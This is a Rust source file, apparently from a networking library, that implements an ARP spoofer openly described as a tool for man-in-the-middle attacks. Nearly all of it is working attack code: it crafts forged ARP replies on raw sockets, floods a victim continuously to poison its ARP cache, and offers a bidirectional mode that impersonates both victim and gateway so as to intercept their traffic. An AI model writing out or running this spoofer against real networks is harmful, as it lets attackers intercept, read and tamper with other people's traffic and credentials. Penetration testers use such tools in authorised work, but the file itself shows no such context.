use libc::{sockaddr_ll, socket, AF_PACKET, SOCK_RAW};
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use super::{ArpError, ArpPacket};
use crate::arp::format_mac_address;
use crate::error::{NetlinkError, Result};
use crate::interface::InterfaceManager;

/// ARP Spoofer for man-in-the-middle attacks
pub struct ArpSpoofer {
    running: Arc<AtomicBool>,
}

/// Configuration for ARP spoofing
#[derive(Debug, Clone)]
pub struct ArpSpoofConfig {
    /// Target IP to spoof (victim)
    pub target_ip: Ipv4Addr,
    /// IP to impersonate (usually gateway)
    pub spoof_ip: Ipv4Addr,
    /// Our MAC address to use
    pub attacker_mac: [u8; 6],
    /// Interface to send packets on
    pub interface: String,
    /// Interval between spoof packets (milliseconds)
    pub interval_ms: u64,
    /// Whether to restore ARP tables on stop
    pub restore_on_stop: bool,
}

impl ArpSpoofer {
    /// Create a new ARP spoofer
    pub fn new() -> Self {
        ArpSpoofer {
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Send a single ARP spoof packet
    pub fn send_spoof(
        target_ip: Ipv4Addr,
        target_mac: [u8; 6],
        spoof_ip: Ipv4Addr,
        attacker_mac: [u8; 6],
        interface: &str,
    ) -> Result<()> {
        // Get interface index
        let if_index = Self::get_interface_index(interface)?;

        // Create raw socket
        let sock_fd = Self::create_raw_socket(interface)?;

        // Build ARP reply packet (spoofed)
        let packet = ArpPacket::new_reply(
            attacker_mac, // Our MAC as sender
            spoof_ip,     // IP we're impersonating
            target_mac,   // Target's MAC
            target_ip,    // Target's IP
        );

        // Send the packet
        Self::send_arp_packet(sock_fd, &packet, if_index, target_mac, interface, target_ip)?;

        // Close socket
        unsafe {
            libc::close(sock_fd);
        }

        Ok(())
    }

    /// Start continuous ARP spoofing in background
    pub fn start_continuous(&mut self, config: ArpSpoofConfig) -> Result<()> {
        if self.running.load(Ordering::Relaxed) {
            return Err(NetlinkError::Arp(ArpError::SpoofError {
                interface: config.interface.clone(),
                reason: "ARP spoofing already running".to_string(),
            }));
        }

        // Get target's real MAC address first
        let scanner = super::ArpScanner::new();
        let target_mac = scanner
            .get_mac(config.target_ip, &config.interface)?
            .ok_or_else(|| ArpError::SpoofError {
                interface: config.interface.clone(),
                reason: format!(
                    "Could not find MAC address for target IP {}",
                    config.target_ip
                ),
            })?;

        self.running.store(true, Ordering::Relaxed);
        let running = Arc::clone(&self.running);

        let _handle = thread::spawn(move || {
            tracing::info!(
                "Starting ARP spoof: {} ({}) -> {} on {}",
                config.spoof_ip,
                format_mac_address(&config.attacker_mac),
                config.target_ip,
                config.interface
            );

            while running.load(Ordering::Relaxed) {
                if let Err(e) = Self::send_spoof(
                    config.target_ip,
                    target_mac,
                    config.spoof_ip,
                    config.attacker_mac,
                    &config.interface,
                ) {
                    tracing::error!("ARP spoof packet failed: {}", e);
                }

                thread::sleep(Duration::from_millis(config.interval_ms));
            }

            // Restore original ARP entry if requested
            if config.restore_on_stop {
                tracing::info!("Restoring ARP table for {}", config.target_ip);
                // Get real gateway MAC
                if let Ok(Some(real_mac)) = scanner.get_mac(config.spoof_ip, &config.interface) {
                    for _ in 0..5 {
                        let _ = Self::send_spoof(
                            config.target_ip,
                            target_mac,
                            config.spoof_ip,
                            real_mac,
                            &config.interface,
                        );
                        thread::sleep(Duration::from_millis(100));
                    }
                }
            }

            tracing::info!("ARP spoofing stopped");
        });

        Ok(())
    }

    /// Stop continuous ARP spoofing
    pub fn stop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
    }

    /// Check if spoofing is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }

    /// Perform bidirectional MITM (spoof both target and gateway)
    pub fn start_mitm(
        &mut self,
        target_ip: Ipv4Addr,
        gateway_ip: Ipv4Addr,
        attacker_mac: [u8; 6],
        interface: &str,
    ) -> Result<()> {
        // Get MAC addresses
        let scanner = super::ArpScanner::new();

        let target_mac =
            scanner
                .get_mac(target_ip, interface)?
                .ok_or_else(|| ArpError::SpoofError {
                    interface: interface.to_string(),
                    reason: format!("Could not find MAC address for target IP {}", target_ip),
                })?;

        let gateway_mac =
            scanner
                .get_mac(gateway_ip, interface)?
                .ok_or_else(|| ArpError::SpoofError {
                    interface: interface.to_string(),
                    reason: format!("Could not find MAC address for gateway IP {}", gateway_ip),
                })?;

        self.running.store(true, Ordering::Relaxed);
        let running = Arc::clone(&self.running);

        let interface = interface.to_string();
        let _handle = thread::spawn(move || {
            tracing::info!(
                "Starting bidirectional MITM: {} <-> {} on {}",
                target_ip,
                gateway_ip,
                interface
            );

            while running.load(Ordering::Relaxed) {
                // Tell target that we are the gateway
                let _ =
                    Self::send_spoof(target_ip, target_mac, gateway_ip, attacker_mac, &interface);

                // Tell gateway that we are the target
                let _ =
                    Self::send_spoof(gateway_ip, gateway_mac, target_ip, attacker_mac, &interface);

                thread::sleep(Duration::from_millis(1000));
            }

            tracing::info!("MITM attack stopped");
        });

        Ok(())
    }

    // Private helper methods

    fn create_raw_socket(interface: &str) -> Result<i32> {
        let sock_fd =
            unsafe { socket(AF_PACKET, SOCK_RAW, (libc::ETH_P_ARP as u16).to_be() as i32) };

        if sock_fd < 0 {
            let err = std::io::Error::last_os_error();
            return if err.raw_os_error() == Some(libc::EPERM) {
                Err(NetlinkError::Arp(ArpError::PermissionDenied))
            } else {
                Err(NetlinkError::Arp(ArpError::SocketCreate {
                    interface: interface.to_string(),
                    source: err,
                }))
            };
        }

        Ok(sock_fd)
    }

    fn send_arp_packet(
        sock_fd: i32,
        packet: &ArpPacket,
        if_index: u32,
        target_mac: [u8; 6],
        interface: &str,
        target_ip: Ipv4Addr,
    ) -> Result<()> {
        // Ethernet frame: dest MAC + source MAC + EtherType (ARP) + ARP packet
        let mut frame = Vec::new();
        frame.extend_from_slice(&target_mac); // Destination MAC (target)
        frame.extend_from_slice(&packet.sender_mac); // Source MAC (us)
        frame.extend_from_slice(&0x0806u16.to_be_bytes()); // EtherType: ARP
        frame.extend_from_slice(packet.as_bytes()); // ARP packet

        let mut sll: sockaddr_ll = unsafe { std::mem::zeroed() };
        sll.sll_family = AF_PACKET as u16;
        sll.sll_protocol = (libc::ETH_P_ARP as u16).to_be();
        sll.sll_ifindex = if_index as i32;
        sll.sll_halen = 6;
        sll.sll_addr[..6].copy_from_slice(&target_mac);

        let result = unsafe {
            libc::sendto(
                sock_fd,
                frame.as_ptr() as *const libc::c_void,
                frame.len(),
                0,
                &sll as *const _ as *const libc::sockaddr,
                std::mem::size_of::<sockaddr_ll>() as libc::socklen_t,
            )
        };

        if result < 0 {
            return Err(NetlinkError::Arp(ArpError::SendRequest {
                target_ip,
                interface: interface.to_string(),
                source: std::io::Error::last_os_error(),
            }));
        }

        Ok(())
    }

    fn get_interface_index(interface: &str) -> Result<u32> {
        let mgr = InterfaceManager::new()?;
        if let Ok(handle) = tokio::runtime::Handle::try_current() {
            handle.block_on(async { mgr.get_index(interface).await })
        } else {
            let rt = tokio::runtime::Runtime::new().map_err(|e| {
                NetlinkError::Arp(ArpError::MacAddressError {
                    interface: interface.to_string(),
                    reason: format!("Failed to create runtime: {}", e),
                })
            })?;
            rt.block_on(async { mgr.get_index(interface).await })
        }
    }
}

impl Default for ArpSpoofer {
    fn default() -> Self {
        Self::new()
    }
}

impl Drop for ArpSpoofer {
    fn drop(&mut self) {
        self.stop();
    }
}
